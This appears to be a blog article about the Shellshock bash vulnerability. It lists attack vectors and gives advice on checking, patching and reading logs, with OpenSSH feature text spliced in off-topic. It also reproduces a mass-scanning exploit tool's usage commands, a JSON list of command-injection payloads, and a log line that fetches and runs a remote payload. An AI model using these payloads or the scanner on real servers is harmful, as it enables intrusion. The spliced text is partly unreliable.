<p>Kaspersky Labs Corporation reported that some of the infected computers launched a DDoS attack against three targets&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-Wired-8">[8]</a></sup>&nbsp;.&nbsp;On September 26, the “wopbot” botnet was discovered, composed of servers infected through bashdoor, and used in DDoS against&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Akamai_Technologies">Akamai Technologies</a>&nbsp;CDN &nbsp;and to scan US Department of Defense networks&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-IT-20140926-JS-7">[7]</a></sup>&nbsp;.</p>



<p>There are several potential ways that an attacker could use to pass arbitrary environment variables to bash running on the target server:</p>



<h3 class="wp-block-heading">CGI attack on Bitcoin blockchain web servers.</h3>



<p>Web servers running&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Common_Gateway_Interface">Common Gateway Interface</a>&nbsp;&nbsp;(CGI) scripts pass details about the user request through environment variables such as HTTP_USER_AGENT.&nbsp;If the request is processed by the Bash program, or another program that calls bash internally, then the attacker can replace the User-Agent string transmitted via http with the Shellshock attack trigger, adding his own commands.&nbsp;For example, the “ping” instruction with the attacker’s address can be used as such a command.&nbsp;Based on incoming ping requests, the attacker knows whether the attack worked.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-13.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3567"></figure>



<p>Although CGI is an outdated interface with other security risks&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-37">[37]</a></sup>&nbsp;, it is still used.&nbsp;For example, one of the standard&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/CPanel">cPanel scripts&nbsp;</a><sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-38">[38]</a></sup>&nbsp;is vulnerable ; it is estimated that a vulnerable cPanel can be used on 2-3% of websites&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-39">[39]</a></sup>&nbsp;.</p>



<h3 class="wp-block-heading">Attack on SSH server</h3>



<p><a href="https://ru.wikipedia.org/wiki/OpenSSH">The OpenSSH</a>&nbsp;SSH server&nbsp;&nbsp;&nbsp;allows you to limit the user to a fixed set of available commands (the “ForceCommand” option).&nbsp;The fixed command is executed even if the user has requested the execution of another command.&nbsp;The requested command is then stored in the environment variable “SSH_ORIGINAL_COMMAND”.&nbsp;If a fixed command is executed in a Bash shell (if the user shell is installed in Bash), GNU Bash will detect the SSH_ORIGINAL_COMMAND values ​​embedded in the environment at startup, and, if vulnerable to Bashdoor, will execute the commands embedded there.&nbsp;Thus, an attacker with access only to a limited shell gains unrestricted access&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-qualys-3">[3]</a></sup>&nbsp;.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-7.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3558"></figure>



<p>The OpenSSH kit contains the following components: ssh Replacement for&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Rlogin">rlogin</a>&nbsp;&nbsp;and&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Telnet">telnet</a>&nbsp;.scp Replacement for&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=Rcp&amp;action=edit&amp;redlink=1">rcp , using the&nbsp;</a><a href="https://ru.wikipedia.org/wiki/SFTP">SFTP</a>&nbsp;protocol in modern versions of OpenSSH&nbsp;&nbsp;&nbsp;(previously the less reliable and flexible&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SCP">SCP</a>&nbsp;was used ). sftp Replacement for&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/FTP">the FTP</a>&nbsp;client, using the&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SFTP">SFTP</a>&nbsp;protocol .sshd&nbsp;<a href="https://ru.wikipedia.org/wiki/%D0%94%D0%B5%D0%BC%D0%BE%D0%BD_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B0)">Daemon</a>&nbsp;, which actually provides secure access to resources.&nbsp;<a href="https://ru.wikipedia.org/wiki/SFTP">Includes an SFTP</a>&nbsp;&nbsp;server&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B5_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5)">implementation</a>&nbsp;suitable&nbsp;&nbsp;for providing&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Chroot">chroot</a>&nbsp;access to users without having to copy any files inside chroot.sftp-server Separate implementation of the&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SFTP">SFTP</a>&nbsp;subsystem &nbsp;(<a href="https://ru.wikipedia.org/wiki/SFTP"></a><a href="https://ru.wikipedia.org/wiki/Chroot"></a><a href="https://ru.wikipedia.org/wiki/SFTP"></a><a href="https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B5_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5)">server</a>&nbsp;&nbsp;part).&nbsp;It has more capabilities than the built-in&nbsp;&nbsp;<em>sshd</em>&nbsp;.ssh-keygen Key pair generator .ssh-keysign Utility for checking host keys.&nbsp;Enabled when using host authentication (similar to&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=Rsh&amp;action=edit&amp;redlink=1">rsh</a>&nbsp;) instead of the default user authentication. ssh-keyscan Helper utility.&nbsp;Allows you to collect public keys from other hosts.ssh-agentHelper utility.&nbsp;Maintains&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/%D0%9A%D1%8D%D1%88">a cache</a>&nbsp;of private keys.&nbsp;Caching allows you to avoid having to frequently enter a password to decrypt keys before using them. ssh-add Helper utility.&nbsp;Adds keys to the&nbsp;&nbsp;<em>ssh-agent</em>&nbsp;cache .</p>



<h2 class="wp-block-heading">Safe tunnels</h2>



<h3 class="wp-block-heading">Port Forwarding</h3>



<p>Most programs use the&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/TCP">TCP</a>&nbsp;protocol to establish a connection , the traffic of which can be transmitted through a secure tunnel.&nbsp;This way you can establish many additional TCP connections on top of a single SSH connection.&nbsp;This is useful for hiding connections and encrypting protocols that are insecure, as well as for bypassing firewall restrictions.&nbsp;<a href="https://ru.wikipedia.org/wiki/UDP">UDP</a>&nbsp;connections can sometimes also be tunneled using additional programs such as&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Netcat">netcat</a>&nbsp;.&nbsp;The easiest protocols to tunnel are&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/HTTP">HTTP</a>&nbsp;,&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/POP3">POP3</a>&nbsp;&nbsp;and&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Virtual_Network_Computing">VNC</a>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-12.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3563"></figure></div>


<p>Port forwarding is possible in any direction.</p>



<p>Additionally, some software can automatically use OpenSSH to create a tunnel.&nbsp;For example&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=DistCC&amp;action=edit&amp;redlink=1">DistCC</a>&nbsp;,&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/CVS">CVS</a>&nbsp;,&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Rsync">rsync</a>&nbsp;, and&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Fetchmail">fetchmail</a>&nbsp;.</p>



<p>Of the protocols that are more difficult to tunnel, it is worth noting&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/FTP">FTP</a>&nbsp;, which can often be replaced by&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SFTP">SFTP</a>&nbsp;, and&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SMB">SMB</a>&nbsp;.&nbsp;On some operating systems, remote&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/%D0%A4%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2%D0%B0%D1%8F_%D1%81%D0%B8%D1%81%D1%82%D0%B5%D0%BC%D0%B0">file systems</a>&nbsp;&nbsp;can be mounted via ssh using&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=Shfs&amp;action=edit&amp;redlink=1">shfs</a>&nbsp;,&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=Lufs&amp;action=edit&amp;redlink=1">lufs</a>&nbsp;&nbsp;and other similar components.</p>



<h3 class="wp-block-heading"><a href="https://ru.wikipedia.org/wiki/X_Window_System">X Window System</a></h3>



<p>OpenSSH allows you to securely organize connections to the X Window System, taking into account the “revolution” of semantics: the host SSH client for the X Window System is a server, and vice versa.&nbsp;To do this, OpenSSH performs additional operations such as setting the DISPLAY environment variable.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-11.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3562"></figure></div>


<h3 class="wp-block-heading">SOCKS</h3>



<p>OpenSSH can be used as a special&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/SOCKS">SOCKS</a>&nbsp;&nbsp;proxy server that supports more flexible proxying than just port forwarding.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-10.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3561"></figure></div>


<h3 class="wp-block-heading">VPN</h3>



<p><a href="https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%82%D0%B5%D0%B2%D0%B0%D1%8F_%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D1%8C_OSI">Since version 4.3, OpenSSH can use OSI layer</a>&nbsp;2 and layer 3 tunnel network interfaces&nbsp;&nbsp;&nbsp;(&nbsp;<a href="https://ru.wikipedia.org/wiki/TUN/TAP">tun</a>&nbsp;).&nbsp;This way, you can organize a secure VPN and avoid the need to redesign applications to support SOCKS.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-8-1024x613.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3559"></figure>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-9-1024x355.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3560"></figure>



<h2 class="wp-block-heading">Authentication</h2>



<p>The OpenSSH server can authenticate users using built-in authentication mechanisms:</p>



<ul>
<li>Public keys,</li>



<li>Keyboard input (passwords and challenge-response),</li>



<li>Kerberos/GSS-API.</li>
</ul>



<p>In addition, OpenSSH Portable can usually use authentication methods available on the specific operating system, such as&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=BSD_Authentication&amp;action=edit&amp;redlink=1">BSD Authentication</a>&nbsp;&nbsp;or&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Pluggable_Authentication_Modules">PAM</a>&nbsp;.</p>



<h3 class="wp-block-heading">DHCP client attack</h3>



<p><a href="https://ru.wikipedia.org/wiki/DHCP">A DHCP</a>&nbsp;client typically requests an IP address from a DHCP server.&nbsp;However, the server may send several additional options that can be written to environment variables and lead to the exploitation of the Shellshock error on a computer or laptop connected to the local network.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-5-1024x554.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3556"></figure>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-6-1024x606.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3557"></figure>



<h3 class="wp-block-heading">Elevating privileges through setuid programs</h3>



<p>A program with the setuid bit set can call bash directly, or indirectly through&nbsp;&nbsp;<a href="http://linux.die.net/man/3/system">system(3)</a>&nbsp;, popen , and other system calls, without clearing environment variables.&nbsp;A Shellshock attack in such cases will allow a local user to escalate their own privileges to the owner of such a setuid program, often all the way to root (superuser).</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-3-1024x557.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3554"></figure>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-4-1024x565.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3555"></figure>



<h3 class="wp-block-heading">Vulnerability of offline systems</h3>



<p>The bug could potentially reach systems that are not connected to the Internet during offline processing with bash.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>CVE-2014-6271 (Bash) is an easily exploitable vulnerability that can lead to very serious consequences.&nbsp;By exploiting this vulnerability, an attacker is able to execute system-level commands with the same privileges as the affected services.</p>



<p>In most cases occurring on the Internet today, cybercriminals remotely attack web servers that host CGI scripts written in bash.</p>



<p><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener">Currently, the vulnerability has already been exploited by cybercriminals: vulnerable web servers have been infected with malware, and hacker attacks have also been carried out.&nbsp;</a>Kaspersky Lab analysts are constantly discovering new malicious samples and cases of infection using this vulnerability.&nbsp;More information about this malware will be published soon.</p>



<p>It is important to understand that this vulnerability is not tied to a specific service, such as Apache or nginx.&nbsp;Rather, it is a vulnerability in the bash shell that allows an attacker to add system-level commands to bash environment variables.</p>



<h3 class="wp-block-heading" id="kak-ekspluatiruetsya-uyazvimost">How is the vulnerability exploited?</h3>



<p>I will try to explain the principle of exploitation of the vulnerability using the examples given in information messages and published conceptual code.&nbsp;A CGI script hosted on a web server automatically reads certain environment variables such as IP address, browser version, and local system information.</p>



<p>Now imagine being able to not only pass this normal system information to a CGI script, but also have the script execute system-level commands.&nbsp;This means that as soon as the CGI script is accessed, it reads your environment variables – without any registration with the web server.&nbsp;If the environment variables contain the exploit string, the script will also execute the command you specify.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">ShellShockHunter Tool v1.0</h2>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-30-1024x606.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3606"></figure>



<p><strong>Shellshock (software bug)</strong></p>



<p>Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was discovered on September 24, 2014.&nbsp;Shellshock could allow an attacker to force Bash to execute arbitrary commands and gain unauthorized access to many Internet files.&nbsp;encounter services such as web servers that use Bash to process requests.</p>



<p><strong>GIT CLONE</strong></p>



<pre class="wp-block-code"><code>git clone https://github.com/MrCl0wnLab/ShellShockHunter</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>INSTALLATION&nbsp;pip</strong></p>



<pre class="wp-block-code"><code>pip install shodan
pip install ipinfo</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>                                 ,'/
                               ,' /
                             ,'  /_____,
                           .'____    ,'    
                                /  ,'
                               / ,'
                              /,'
                             /'
     ____  _     _____ _     _     ____  _      ___       _    
    / ___|| |__ |___ /| |   | |   / ___|| |__  / _ \  ___| | __
    \___ \| '_ \  |_ \| |   | |   \___ \| '_ \| | | |/ __| |/ /
     ___) | | | |___) | |___| |___ ___) | | | | |_| | (__|   &lt; 
    |____/|_| |_|____/|_____|_____|____/|_| |_|\___/ \___|_|\_\
             __   _   _             _              __                  
            | _| | | | |_   _ _ __ | |_ ___ _ __  |_ |                 
            | |  | |_| | | | | '_ \| __/ _ \ '__|  | |                 
            | |  |  _  | |_| | | | | ||  __/ |     | |                 
            | |  |_| |_|\__,_|_| |_|\__\___|_|     | |                 
            |__|                                  |__| v1.0                
              By: MrCl0wn / https://blog.mrcl0wn.com                                                                          
 
usage: tool [-h] [--file &lt;ips.txt&gt;] [--range &lt;ip-start&gt;,&lt;ip-end&gt;] [--cmd-cgi &lt;command shell&gt;] [--exec-vuln &lt;command shell&gt;] [--thread &lt;10&gt;] [--check] [--ssl] [--cgi-file &lt;cgi.txt&gt;] [--timeout &lt;5&gt;] [--all] [--debug]

optional arguments:
  -h, --help        show this help message and exit
  --file &lt;ips.txt&gt;  File targets
  --range &lt;ip-start&gt;,&lt;ip-end&gt;
                    Range IP Ex: 192.168.15.1,192.168.15.100
  --cmd-cgi &lt;command shell&gt;
                    Command: uname -a
  --exec-vuln &lt;command shell&gt;
                    Executing commands on vulnerable targets
  --thread &lt;10&gt;, -t &lt;10&gt;
                    Eg. 20
  --check           Checker vuln
  --ssl             Set protocol https
  --cgi-file &lt;cgi.txt&gt;
                    Set file cgi
  --timeout &lt;5&gt;     Set timeout conection
  --all             Teste all payloads
  --debug           Set debugs</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">COMMAND:</h2>



<pre class="wp-block-code"><code>python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --range '194.206.187.X,194.206.187.XXX' --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt' --all

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln 'curl -v -k -i "_TARGET_"'

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln './exploit -t "_TARGET_"'</code></pre>



<h3 class="wp-block-heading" id="v-chem-unikalnost-etoj-uyazvimosti">What makes this vulnerability unique?</h3>



<p>This vulnerability is extremely easy to exploit, which leads to extremely serious consequences – not least due to the number of vulnerable targets.&nbsp;This applies not only to web servers, but also to any software that uses the bash interpreter and reads data that you can control.</p>



<p>Analysts are currently investigating whether other interpreters such as PHP, JSP, Python and Perl are affected by this vulnerability.&nbsp;Depending on how the code is written, the interpreter may, in some cases, use bash to perform a number of functions.&nbsp;In this regard, the exploitation of the CVE-2014-6271 vulnerability can be carried out through other interpreters.</p>



<p><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener">Exploitation of the vulnerability</a>&nbsp;has serious consequences due to the fact that CGI scripts are widely used on many devices: routers, home devices and wireless access points.&nbsp;All of them are also vulnerable, and closing the vulnerability on them is often quite difficult.</p>



<h2 class="wp-block-heading" id="17d4">PRINTS:</h2>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-31-1024x557.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3611"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading" id="naskolko-shiroko-ekspluatiruetsya-dannaya-uyazvimost">How widely is this vulnerability exploited?</h3>



<p>It is difficult to give an exact answer to this question.&nbsp;According to Kaspersky Lab information services, the development of exploits and worms began immediately after the publication of information about the vulnerability.&nbsp;The search for vulnerable servers on the Internet is carried out by both white and black hackers.</p>



<p>There is not enough data yet to determine how widespread this&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">vulnerability</a>&nbsp;is .&nbsp;From my personal research, I know that many web servers run on CGI scripts.&nbsp;It is very likely that a large number of exploits will be developed in the future that target local files and network daemons.&nbsp;In addition, there are suspicions that OpenSSH and dhcp clients are also vulnerable to this type of attack.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-32-1024x519.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3612"></figure>



<h3 class="wp-block-heading" id="kak-proverit-est-li-uyazvimost-v-moej-sisteme-vebsajte">How to check if there is a vulnerability in my system/website?</h3>



<p>The easiest way to check your system for&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">vulnerabilities</a>&nbsp;is to open a bash shell on your system and run the following command:</p>



<figure class="wp-block-table"><table><tbody><tr><td>1</td><td>“env x='() { :;}; echo vulnerable’ bash&nbsp;&nbsp;-c “echo this is a test”</td></tr></tbody></table></figure>



<p>If the shell returns the string “vulnerable”, the system needs to be updated.</p>



<p>For more experienced users, there are other tools that allow you to check your server for this vulnerability.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-33-1024x403.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3613"></figure>



<h3 class="wp-block-heading" id="kak-reshit-problemu">How to solve a problem?</h3>



<p>First of all, you need to update the version of the bash environment.&nbsp;Patches for this&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">vulnerability</a>&nbsp;are available on various Linux distributions.&nbsp;And even though not all patches have proven to be 100% effective to date, you should start by installing them.</p>



<p>If you are using any intrusion detection and/or prevention system, it is also recommended to add/download a signature for this threat.&nbsp;Many public rules have been published.</p>



<p>Finally, check your web server configuration.&nbsp;If there are unused CGI scripts, consider disabling them.</p>



<pre class="wp-block-code"><code>{
    "DEFAULT":
        "() { :; }; echo ; /bin/bash -c '_COMMAND_'",
    "CVE-2014-6271": 
        "() { :; }; echo _CHECKER_; /bin/bash -c '_COMMAND_'",
    "CVE-2014-6271-2":
        "() { :;}; echo '_CHECKER_' 'BASH_FUNC_x()=() { :;}; echo _CHECKER_' bash -c 'echo _COMMAND_'",
    "CVE-2014-6271-3":
        "() { :; }; echo ; /bin/bash -c '_COMMAND_';echo _CHECKER_;",
    "CVE-2014-7169":
        "() { (a)=&gt;\\' /bin/bash -c 'echo _CHECKER_'; cat echo",
    "CVE-2014-7186":
        "/bin/bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' || echo '_CHECKER_, redir_stack'",
    "CVE-2014-7187":
        "(for x in {1..200} ; do echo \"for x$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | /bin/bash || echo '_CHECKER_, word_lineno'",
    "CVE-2014-6278":
        "() { _; } &gt;_[$($())] { echo _CHECKER_; id; } /bin/bash -c '_COMMAND_'",
    "CVE-2014-6278-2":    
        "shellshocker='() { echo _CHECKER_; }' bash -c shellshocker",
    "CVE-2014-6277":
        "() { x() { _; }; x() { _; } &lt;&lt;a; } /bin/bash -c _COMMAND_;echo _CHECKER_",
    "CVE-2014-*":
        "() { }; echo _CHECKER_' /bin/bash -c '_COMMAND_'"
}</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading" id="est-li-ugroza-dlya-onlajn-bankinga">Is there a threat to online banking?</h3>



<p>The exploitation of this vulnerability is widely used in relation to servers located on the Internet.&nbsp;Even some workstations running Linux and OSX are vulnerable, but to carry out an attack, cybercriminals need to find an attack vector that allows them to remotely exploit the vulnerability on a specific workstation.</p>



<p>This threat is not aimed at individual users, but at servers located on the Internet.&nbsp;This means that if, for example, your favorite e-commerce or online banking site is vulnerable, attackers could theoretically hack the server and gain access to your personal data, including possibly banking information.</p>



<p>It’s difficult to say for sure which platforms may be vulnerable and targeted, but I would recommend not making credit card payments or sharing sensitive information online for the next couple of days until virus analysts clear up the situation.</p>



<pre class="wp-block-code"><code>{
    "config": {
        "threads": 10,
        "path": {
            "path_output": "output/",
            "path_wordlist": "wordlist/",
            "path_modules": "modules/",
            "path_assets": "assets/"
        },
        "files_assets":{
            "config": "assets/config.json",
            "autor": "assets/autor.json",
            "exploits": "assets/exploits.json"
        },
        "api":{
            "shodan":"",
            "ipinfo":""
        }
    }
}</code></pre>



<h3 class="wp-block-heading" id="kak-ya-mogu-opredelit-chto-stal-mishenyu-dlya-ataki-s-ispolzovaniem-etoj-uyazvimosti">How can I determine if I have been targeted by an attack using this vulnerability?</h3>



<p>We recommend reviewing your HTTP logs for suspicious activity, such as this:</p>



<figure class="wp-block-table"><table><tbody><tr><td>1</td><td>192.168.1.1 – – [25/Sep/2014:14:00:00 +0000] “GET / HTTP/1.0” 400 349 “() { :; }; wget -O /tmp/besh http://192.168.1.1/filename; chmod 777 /tmp/besh; /tmp/besh;”</td></tr></tbody></table></figure>



<p>There are also some patches for the bash environment that log every command passed to the bash interpreter, allowing you to see if your computer has been attacked.&nbsp;They will not protect you from an attack that exploits&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">this vulnerability</a>&nbsp;, but they will log the attacker’s actions on your system.</p>



<pre class="wp-block-code"><code>│   ├── autor.json
│   ├── config.json
│   ├── exploits.json
│   └── prints
│       ├── banner.png
│       ├── print01.png
│       ├── print02.png
│       └── print03.png
├── main.py
├── modules
│   ├── banner_shock.py
│   ├── color_shock.py
│   ├── file_shock.py
│   ├── __init__.py
│   ├── request_shock.py
│   ├── shodan_shock.py
│   └── thread_shock.py
├── output
│   └── vuln.txt
├── README.md
└── wordlist
└── cgi.txt</code></pre>



<h3 class="wp-block-heading" id="naskolko-serezna-dannaya-ugroza">How serious is this threat?</h3>



<p>The threat is indeed serious, but not every system is vulnerable.&nbsp;Thus, for a successful attack on a web server, a number of conditions must be met.&nbsp;One of the biggest problems now is that after patches are published, researchers begin to look for other ways to exploit the bash environment, analyze the various conditions that make exploitation possible, etc.&nbsp;In this regard, a patch that protects against remote code execution will not be able to prevent, for example, overwriting a file.&nbsp;Apparently, a number of patches will be published in the future, and until then the systems will remain vulnerable.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-35-1024x493.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3621"></figure>



<h3 class="wp-block-heading" id="eto-novyj-heartbleed">Is this the new Heartbleed?</h3>



